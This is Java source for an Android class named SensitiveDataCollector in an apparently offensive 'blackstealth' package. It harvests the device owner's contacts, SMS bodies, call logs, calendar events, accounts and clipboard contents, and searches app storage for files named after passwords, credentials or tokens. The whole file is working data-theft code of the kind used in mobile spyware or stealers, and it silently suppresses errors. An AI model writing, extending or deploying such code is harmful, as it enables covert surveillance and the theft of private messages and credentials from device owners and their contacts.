package com.offensive.blackstealth.gathering;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.CalendarContract;
import android.provider.Browser;
import java.io.*;
import java.util.*;

/**
 * SensitiveDataCollector - Collects sensitive user data from the device
 */
public class SensitiveDataCollector {
    private Context context;
    
    public SensitiveDataCollector(Context context) {
        this.context = context;
    }
    
    /**
     * Collect all sensitive data
     */
    public Map<String, Object> collectAll() {
        Map<String, Object> data = new HashMap<>();
        data.put("contacts", getContacts());
        data.put("sms", getSmsMessages());
        data.put("callLogs", getCallLogs());
        data.put("calendar", getCalendarEvents());
        data.put("accounts", getAccounts());
        data.put("passwords", getStoredPasswords());
        return data;
    }
    
    public List<Map<String, String>> getContacts() {
        List<Map<String, String>> contacts = new ArrayList<>();
        try {
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                }, null, null, null);
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    Map<String, String> contact = new HashMap<>();
                    contact.put("name", cursor.getString(0));
                    contact.put("number", cursor.getString(1));
                    contacts.add(contact);
                }
                cursor.close();
            }
        } catch (Exception e) {}
        return contacts;
    }
    
    public List<Map<String, Object>> getSmsMessages() {
        List<Map<String, Object>> messages = new ArrayList<>();
        try {
            Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
                }, null, null, Telephony.Sms.DATE + " DESC LIMIT 500");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    Map<String, Object> msg = new HashMap<>();
                    msg.put("address", cursor.getString(0));
                    msg.put("body", cursor.getString(1));
                    msg.put("date", cursor.getLong(2));
                    msg.put("type", cursor.getInt(3));
                    messages.add(msg);
                }
                cursor.close();
            }
        } catch (Exception e) {}
        return messages;
    }
    
    public List<Map<String, Object>> getCallLogs() {
        List<Map<String, Object>> logs = new ArrayList<>();
        try {
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE
                }, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    Map<String, Object> log = new HashMap<>();
                    log.put("number", cursor.getString(0));
                    log.put("name", cursor.getString(1));
                    log.put("date", cursor.getLong(2));
                    log.put("duration", cursor.getLong(3));
                    log.put("type", cursor.getInt(4));
                    logs.add(log);
                }
                cursor.close();
            }
        } catch (Exception e) {}
        return logs;
    }
    
    public List<Map<String, Object>> getCalendarEvents() {
        List<Map<String, Object>> events = new ArrayList<>();
        try {
            Cursor cursor = context.getContentResolver().query(
                CalendarContract.Events.CONTENT_URI,
                new String[]{
                    CalendarContract.Events.TITLE,
                    CalendarContract.Events.DESCRIPTION,
                    CalendarContract.Events.DTSTART,
                    CalendarContract.Events.EVENT_LOCATION
                }, null, null, CalendarContract.Events.DTSTART + " DESC LIMIT 100");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    Map<String, Object> event = new HashMap<>();
                    event.put("title", cursor.getString(0));
                    event.put("description", cursor.getString(1));
                    event.put("start", cursor.getLong(2));
                    event.put("location", cursor.getString(3));
                    events.add(event);
                }
                cursor.close();
            }
        } catch (Exception e) {}
        return events;
    }
    
    public List<String> getAccounts() {
        List<String> accounts = new ArrayList<>();
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(context);
            for (android.accounts.Account account : am.getAccounts()) {
                accounts.add(account.type + ": " + account.name);
            }
        } catch (Exception e) {}
        return accounts;
    }
    
    /**
     * Search for stored passwords in common locations
     */
    public List<String> getStoredPasswords() {
        List<String> passwords = new ArrayList<>();
        
        // Check common credential storage locations
        String[] paths = {
            "/data/data/" + context.getPackageName() + "/shared_prefs/",
            "/data/data/" + context.getPackageName() + "/databases/"
        };
        
        for (String path : paths) {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.getName().contains("password") || 
                            file.getName().contains("credential") ||
                            file.getName().contains("token")) {
                            passwords.add(file.getAbsolutePath());
                        }
                    }
                }
            }
        }
        
        return passwords;
    }
    
    /**
     * Get clipboard content
     */
    public String getClipboard() {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                context.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                android.content.ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    return text != null ? text.toString() : "";
                }
            }
        } catch (Exception e) {}
        return "";
    }
}
